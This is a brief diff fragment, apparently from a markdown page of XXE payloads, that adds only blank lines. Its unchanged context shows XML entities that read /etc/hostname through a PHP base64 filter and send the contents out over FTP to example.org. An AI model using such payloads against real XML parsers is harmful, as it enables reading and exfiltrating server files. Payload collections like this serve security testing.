@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:24:37.953681+00:00'
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://example.org:2121/%data;'>">
 ```
+
+
